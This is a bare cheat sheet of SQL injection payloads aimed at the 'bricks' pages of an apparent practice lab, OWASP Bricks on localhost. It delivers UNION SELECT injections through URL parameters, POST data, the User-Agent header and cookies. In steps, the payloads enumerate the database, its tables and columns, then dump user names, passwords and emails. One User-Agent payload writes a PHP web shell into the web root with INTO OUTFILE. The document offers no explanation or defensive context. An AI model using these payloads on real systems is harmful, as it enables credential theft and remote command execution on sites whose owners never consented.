### Content page 
```
https://localhost/demo/bricks/content-2/index.php ?user=harry' UNION SELECT database(),version(),user(),4,5,6,7,8 LIMIT 1,1 --+
bricks/content-2/index.php ?user=harry' UNION SELECT group_concat(column_name,0x0a),2,3,4,5,6,7,8 from information_schema.columns where table_name='users' LIMIT 1,1 --+
bricks/content-2/index.php ?user=harry' UNION SELECT group_concat(name,0x0a,password),2,3,4,5,6,7,8 from users LIMIT 1,1 --+
```
### Content page 
```
POST Data: username=harry' UNION SELECT database(),version(),user(),4,5,6,7,8 limit 1,1 -- +&submit=Submit #To Enumerate
POST Data: username=tom' UNION SELECT group_concat(table_name,0x0a),2,3,4,5,6,7,8 from information_schema.tables where table_schema=database() LIMIT 1,1 -- +
POST Data: username=tom' UNION SELECT group_concat(table_name,0x0a),2,3,4,5,6,7,8 from information_schema.tables where table_schema=database() LIMIT 1,1 -- +&submit=Submit #After knowing DatabaseName
POST Data: username=tom' UNION SELECT group_concat(column_name,0x0a),2,3,4,5,6,7,8 from information_schema.columns where table_name='users' LIMIT 1,1 -- +&submit=Submit #After Knowing Tables Name where exist in the base
POST Data: username=tom' UNION SELECT group_concat(name,0x0a,password),2,3,4,5,6,7,8 from users LIMIT 1,1 -- +&submit=Submit
POST Data: username=tom' UNION SELECT group_concat(name,0x0a,password,0x0a,email),2,3,4,5,6,7,8 from users LIMIT 1,1 -- +&submit=Submit
```
### Advanced SQL Injection on user agent
```
User-Agent: Brick_Browser' UNION SELECT 1,2,3,4,5,6,7,8 -- +
User-Agent: Brick_Browser' union all select"<?php echo shell_exec($_GET['cmd']);?>" into outfile '/var/www/html/x.php'; -- x
User-Agent: Brick_Browser' UNION SELECT database(),version(),user(),4,5,6,7,8 limit 1,1 -- +
User-Agent: Brick_Browser' UNION SELECT group_concat(table_name,0x0a),2,3,4,5,6,7,8 from information_schema.tables where table_schema=database() LIMIT 1,1 -- +
User-Agent: Brick_Browser' UNION SELECT group_concat(column_name,0x0a),2,3,4,5,6,7,8 from information_schema.columns where table_name='users' LIMIT 1, 1 -- +
Brick_Browser' UNION SELECT group_concat(name,0x0a,password),2,3,4,5,6,7,8 from users LIMIT 1,1 -- +
```
### Advanced SQL Injection on Cookie
```
Cookie: User=tom' and 1=2 order by 8  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=2 union select 1,2,3,4,5,6,7,8  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=1 union select 1,2,3,4,5,6,7,8  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=1 union select 1,database(),3,4,5,6,7,8  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=1 union select 1,group_concat(column_name,0x0a),3,4,5,6,7,8 from information_schema.columns where table_name='users'  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
Cookie: User=tom' and 1=1 union select 1,group_concat(name,0x0a,password,0x0a,email),3,4,5,6,7,8 from users  limit 1,1 -- -; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=bbpg33l9rnt224b2pjd4mff2d6
```
